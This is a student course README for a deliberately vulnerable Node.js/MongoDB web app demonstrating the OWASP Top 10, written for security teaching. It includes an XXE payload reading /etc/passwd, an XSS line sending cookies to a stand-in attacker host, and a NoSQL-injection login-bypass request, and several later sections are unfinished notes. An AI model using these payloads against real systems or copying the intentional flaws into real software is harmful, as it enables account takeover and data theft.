# Vulnerable RESTful Web App with Node.js, Express, and MongoDB

final project by *Xue Zou*, <br>
Course Cyber-security from Vanderbilt University, <br>
fall 2019, taught by *Dr.Christopher Jules White* 

## Goal
Design a web app with Node.js, Express, and MongoDB and RESTful APIs and demonstrate the **OSWAP Top Ten** on it.

#### Table of Contents

- [OWASP Top 10](#owasp-top-10)
- [About the Web App](#about-the-web-app)
- [Vulnerabilities of the Web App](#vulnerabilities-of-the-web-app)
- [Progress Outline](#progress-outline--answer-to-heilmeier-questions)
- [Clickjacking Vulnerability on YES](#an-interesting-clickjacking-vulnerability-on-vanderbilt-system-yes)

## OWASP Top 10

#### Current official release [OWASP Top 10 2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)

#### what is [OWASP](www.owasp.org)?

The Open Web Application Security Project, or OWASP, is a open non-profit community dedicated to improving the security of software. Their mission is to make software security visible, such that individuals and organizations are able to make informed decisions. 

One of OWASP's core principle is free and open, as all of the OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security. One of their best-known project is the OWASP Top 10.

#### what is [OWAWP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)?

The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, representing a broad consensus about what the 10 most critical web application security flaws are. The report is put together by a team of security professionals from all over the world. OWASP refers to the Top 10 as an ‘awareness document’ and they recommend that all companies incorporate the report into their processes in order to mitigate security risks.

Below are the security risks reported in the OWASP Top 10 2017 report:

1. **Injection**

    Injection attacks happen when malicious data is sent to an interpreter through a form input to a web application. For example, the infamous SQL Injection enter SQL command into a form that expects a plaintext.

    Typically, to prevent injection attack, developers should always think carefully about the design of interfaces of APIs and use positive or "whitelist" server-side input validation.

2. **Broken Authentication**
    
    This type of attack relates to the user's identity, authentication, and session management. Some vulnerabilities in authentication systems can give attackers access to user accounts and even the admin account. For example, an attacker can take lists of known words against a user to form different combinations of passwords and then brute force trying all those combinations on the login system to see if there are any that work.

    Some strategies to mitigate authentication vulnerabilities are implementing weak password check, multi-factor authentication as well as avoiding deploying default credentials and limiting or delaying repeated login attempts using rate limiting.

3. **Sensitive Data Exposure**

    Sensitive Data Exposure is related to protection of sensitive data such as passwords, credit card numbers, health records, personal information and business secrets etc. Attackers can gain access to that data and sell or utilize it for bad purposes.

    Data exposure risk can be mitigated by encrypting all sensitive data with strong algorithms, as well as disabling the caching of any sensitive information. Additionally, developers should ensure that they are not unnecessarily storing any sensitive data.

4. **XML External Entities (XXE)**
    
    XXE attack is against an application that parses XML input. XML, or eXtensible Markup Language, is a markup language used to describe the structure of a document. An entity is an XML document maps some name to a value. An ‘external entity’ in this context refers to a storage unit, such as a hard drive, which is declared with a URI that is dereferenced and evaluated during XML processing. An vulnerable XML processors can be duped into sending data to an unauthorized external entity, which can pass sensitive data directly to an attacker. For example,
    ```
    <?xml version="1.0" encoding="ISO-8859-1"?>
      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
      <foo>&xxe;</foo>
    ```
    Here content of /etc/passwd will be stored in xxe, which can be later transfered back to the attacker, thus revealing sensitive information.

    To mitigate XEE attacks, the easiest way is to use less complex data formats such as JSON, and to avoid serialization of sensitive data, or at the very least to configure XML parser properly and disable the use of external entities in an XML application.

5. **Broken Access Control**

    [Access control](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) enforces policy such that users cannot act outside of their intended permissions. Broken access control typically lead to unauthorized information disclosure, modification or destruction of all data. For example, a user could login as another user just by changing the part of the url.

    Exploitation of access control is a core skill of attackers, who would try to act as users or administrators, use privileged functions, or mess around with every record. Access controls can be secured by automated detection and effective functional testing by application developers.

6. **Security Misconfiguration**

    This is probably the most common mistakes developers might unintentionally make. This vulnerability allows an attacker to accesses default accounts, unused pages, unpatched flaws, unprotected files and directories, etc. to gain unauthorized access to or knowledge of the system. For instance, an application server’s configuration allows detailed error messages, e.g. stack traces, to be returned to users, which potentially exposes sensitive information or underlying flaws.

    The configuration mistakes could me mitigated by removing any unused features and frameworks and ensuring that error messages are more general. Moreover, developers and system administrators need to work together to ensure that the entire stack is configured properly.

7. **Cross-Site Scripting (XSS)**

    XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victims' browser, which can access any cookies, session tokens, or other sensitive information retained by the browser, or redirect user to malicious sites. According to OWASP, XSS is the second most prevalent issue in the Top 10, and is found in around two-thirds of all applications. 

    For example, the application uses untrusted data in the construction of the following HTML snippet without validation or escaping: `(String) page += "<input name='creditcard' type='TEXT' value='" + request getParameter("CC") + "'>";` The attacker modifies the ‘CC’ parameter in the browser to: `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi? foo='+document.cookie</script>'.` This attack causes the victim’s session ID to be sent to the attacker’s website.

    To mitigate XSS, whitelist input validation and data sanitization are essential. Using modern web development frameworks like ReactJS and Ruby on Rails also provides some built-in XSS protection.

8. **Insecure Deserialization**
    
    Applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker, and can result in serious consequences like DDoS attacks and remote code execution attacks.
    
    To protect against insecure deserialization, although monitoring deserialization and implementing type checks would help, the only safe way is to should never accept serialized objects from untrusted sources and to prohibit the deserialization of data from untrusted sources. 

9. **Using Components with known Vulnerabilities**

    Components could be libraries, frameworks, and other software modules. Since these components always run with full privileges, if components with known vulnerabilities are exploited, such an attack can seriously affect the application. 

    To minimize the risk of running components with known vulnerabilities, developers should remove unused dependencies and unnecessary features, components, files or documentation from their projects, as well as ensuring that they are monitoring and receiving components from a trusted source and ensuring they are secure and up to date. 

10. **Insufficient Logging & Monitoring**

    Many web applications are not taking enough steps to detect data breaches, which means the release of confidential, private, or otherwise sensitive information into an unsecured environment. In 2016, identifying a breach took an average of 191 days, which gives attackers a lot of time to cause damage before there is any response. 

    Since attackers rely on the lack of monitoring and timely response to
    achieve their goals without being detected, OWASP recommends that web developers should implement logging and monitoring as well as incident response plans to ensure that they are made aware of attacks on their applications.


## About the Web App

The starting point of this web app is from [here](https://github.com/cwbuecheler/node-tutorial-2-restful-app), which is a simple nodeJS web app with a list of all users. Then to make it a functional web application, I added user authentication, user creation without duplicates, data modification, session persistent etc. The app is developed in node.js and express and connected to NoSQL database MongoDB. 

The directories of the app are
* [/public](./public) - static directories such as /images, currently including js which includes all the client interactions and css files
* [/routes](./public) - route files which implements the APIs and routes
* [/views](./views) - views powered by jade template engine
* [README.md](README.md) - this file
* [app.js](app.js) - central app file 
* [package.json](package.json) - package info

#### Run

To connect to local mongoDB, for example, I have `mongod --dbpath ~/Documents/mongo/db`.

To run the code, git clone and first run `npm install` to install all all required dependencies. Then, run `npm run live` to run the node server with nodemon and go to `http://localhost:3000` for user interface and `http://localhost:3000/admin` for admin interface.

Here are some sample illustrations. Login Interface and user interface. Modifying corresponding field in the lower right boxes would update the database.

<img src="./illustrations/login.png" width="49.6%" /> <img src="./illustrations/logout.png" width="49.6%" />

Admin Interface: Clicking the username of a user would display user info on the left box

<img src="./illustrations/admin.png" width="54%" />


## Vulnerabilities of the Web App

Here I would list how to exploit these vulnerabilities on the application and also propose some solutions.

9. **Using Components with known Vulnerabilities**

    Run `npm audit`, we could see a 'npm audit security report' that lists all known vulnerabilities from the dependency tree, with the risk level, path and more specific details. It also suggests possible actions we should take to resolve the known vulnerabilities and `npm audit fix` would automatically install any compatible updates to vulnerable dependencies. 

    Particularly in this application I intentionally use out-of-date components and we have `found 7 vulnerabilities (3 low, 1 moderate, 2 high, 1 critical) in 2504 scanned packages` through `npm audit`: DOS from both mongoDb and path monk>mongoDb, code injection from Morgan, 'incorrect handling of non-boolean comparisons during minification' and 'regular expression DOS' from path jade>transformers>uglify-js, 'regular expression DOS' from jade>clean-css, and 'Sandbox Bypass Leading to Arbitrary Code Execution' from jade>constantinopl.    
    
    To fix the vulnerability, the application should update all its packages using a simple command `npm audit fix` to update packages. If some known vulnerabilities is not fixed by update of the package sources, we should consider use other secure components (with its dependencies being also secure) to replace the insecure ones.

1. **injection attack**

    Normally people talk about SQL Injection. However, although we no longer deal with a query language in the form of a string, a [NoSQL injetion attack](https://www.owasp.org/index.php/Testing_for_NoSQL_injection) is also possible with their own operators and syntax. 

    In this application, when authenticating user into the system, we have a end point when doing a POST request to `/users/session`. And in this function (/routes/users.js, line 59, called by public/javascripts/global.js line 177), we get 
    ```javascript
    collection.findOne({ username: req.body.username, password: req.body.password })
    ```

    As we note in the request end point `/users/session`, there's no validation for username and password type to be string and also no proper sanitization on both the client and server side. Therefore, as we assume that the username field is coming from a deserialized JSON object, manipulation of the above query is easy. When the JSON document is deserialized, those fields may contain malicious input like below.
    ```javascript
    {
        "username": {"$gt": ""},
        "password": {"$gt": ""}
    }
    ```

    In MongoDB, the field $gt has a special meaning, which is used as the greater than comparator. As such, the username and the password from the database will be compared to the empty string "" and as a result return a true statement. Then the query would return a user in the database and the end-point would login that user, and hence result a login bypass.

    To exploit such vulnerability in our application, we could have the following code in the console. Then when refreshing the page, we are in the session of a user in the database.
    ```javascript 
    await fetch("http://localhost:3000/users/session", 
      {"credentials":"include",
       "headers":
        {"accept":"application/json, text/javascript, */*; q=0.01",
         "accept-language":"en,zh-CN;q=0.9,zh;q=0.8",
         "cache-control":"no-cache",
         "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
         "pragma":"no-cache",
         "sec-fetch-mode":"cors",
         "sec-fetch-site":"same-origin",
         "x-requested-with":"XMLHttpRequest"},
       "referrer":"http://localhost:3000/",
       "referrerPolicy":"no-referrer-when-downgrade",
       "body":"username[$gt]=&password[$gt]=",
       "method":"POST",
       "mode":"cors"});
    ```

    The critical part is the body sent, which is `username[$gt]=&password[$gt]=`. Here in the application, when serializing and deserilizing json, **url-encoded key-value pairs** are used in communication. The string `username[$gt]=` is a special syntax used by the qs module (default in ExpressJS and the body-parser middleware). This syntax is the equivalent of making an JavaScript object with a single parameter called $gt mapped to no value. In essence, the request above will result into a JavaScript object that looks like ` { username: { '$gt': '' }, password: { '$gt': '' } }`, which is exactly the same one described above. Then the request would result a login bypass. 

    For this attack on this particular application, it is also a design problem. When authenticating user, we have lots of more secure ways to accomplish it instead of doing a query use both fields username and password.

    To protects against 'Dollar $' injection attacks, we should implement input validation and sanitization. We should write right validators for route that checks req.params, req.body and req.query for objects and recursively scans for the $ symbol and responds with an error if it is detected.

2. Broken Authentication - 

    It's obvious that the deign of the authentication is problematic. Firstly, following the path `/admin`, the admin account is accessible by everyone. Secondly, user-wise, the password management system is highly insecure since it doesn't have any kind of protection such as weak password check or even multi-factor authentication.

    To mitigate, the admin account should be set securely in some other manner

    admin account
    no password check

3. Sensitive Data Exposure - 
    
    Speaking of senstive data exposure all the field email as sensitive data

    If it is unnecessary remove it from the database.

4. XML External Entities

**xml file injection**

5. Broken Access Control - 

Access control refers a system that controls access to information or functionality. Broken access controls allow attackers to bypass authorization and perform tasks as though they were privileged users such as administrators
is also a example of broken access control

Access controls can be secured by ensuring that a web application uses authorization tokens* and sets tight controls on them.


6. Security Misconfiguration
often the result of using default configurations or displaying excessively verbose errors
**add unused features**
pikachu
secret page

7. Cross-Site Scripting

**Xss**
path parameter add script example

8. Insecure Deserialization

???

10. Insufficient Logging And Monitoring 

In this application, server side has almost no logging except the request made are logged by nodejs. The insufficient logging is not only a bad practice generallt, it also raises issue with 

All failtures should be logged out

Insufficient logging, detection, monitoring and active response
occurs any time:
• Auditable events, such as logins, failed logins, and high-value
transactions are not logged.
• Warnings and errors generate no, inadequate, or unclear log
messages.
• Logs of applications and APIs are not monitored for suspicious
activity.
• Logs are only stored locally.
• Appropriate alerting thresholds and response escalation
processes are not in place or effective.
• Penetration testing and scans by DAST tools (such as OWASP
ZAP) do not trigger alerts.
• The application is unable to detect, escalate, or alert for active
attacks in real time or near real time.
You are vulnerable to information leakage if you make logging
and alerting events visible to a user or an attacker (see A3:2017-
Sensitive Information Exposure).

specificallt 
```jaavscript
// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});
```
in app.js line 49 - 52

The lack of monitoring should be concerns

Generally, insufficient logging and 
a bad practice.



**Broken Authentication**
    
    This type of attack relates to the user's identity, authentication, and session management. Some vulnerabilitoes in authentication systems can give attackers access to user accounts and even the admin account. For example, an attacker can take lists of known words against a user to form different combinations of passwords and then brute force trying all those combinations on the login system to see if there are any that work.

    Some strategies to mitigate authentication vulnerabilities are implementing weak password check, multi-factor authentication as well as avoiding deploying default credentials and limiting or delaying repeated login attempts using rate limiting.


## Progress Outline / Answer to Heilmeier questions

There are already some vulnerable web apps written in NodeJS, such as [dvna](https://github.com/appsecco/dvna) or [vulnerable-node](https://github.com/cr0hn/vulnerable-node), which uses SQL database or [OWASP's NodeGoat](https://github.com/OWASP/NodeGoat), which is a super large and well-maintained project to play around.

This project is different from the projects listed. Firstly it is implemented with mongoDB, and secondly it focus on not only vulnerabilities but also simpleness, with super simple UI interface and back-end APIs to play around with. This vulnerable application could be used to develop, to demonstrate, to fix and to test against. And it sets up an environment to learn how OWASP Top 10 security risks might apply to web applications developed using Node.js and how to possibly address them.

The project would take the later half of the course. To check the mid-term success, I want to finish most of 10 identifications and demonstrations of the vulnerabilities in the above part [Vulnerabilities of the Web App](#vulnerabilities-of-the-web-app). For final exam for this project, I am going to demonstrate the project in a final informative video below and finish the final writeup.

## Final Video demo

Leave this for later. 

## References
1. Code starter reference from [Learn the basics of REST and use them to build an easy, fast, single-page web app.](https://github.com/cwbuecheler/node-tutorial-2-restful-app)
2. More about [OWASP top 10](https://www.cloudflare.com/learning/security/threats/owasp-top-10/)
3. [Injection attack with mongoDB and nodeJS](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)

## An interesting Clickjacking vulnerability on Vanderbilt system YES

This is not part of my final project but I want to also share my process of discovery here. Please visit *[clickjacking](./clickjacking)* if interested.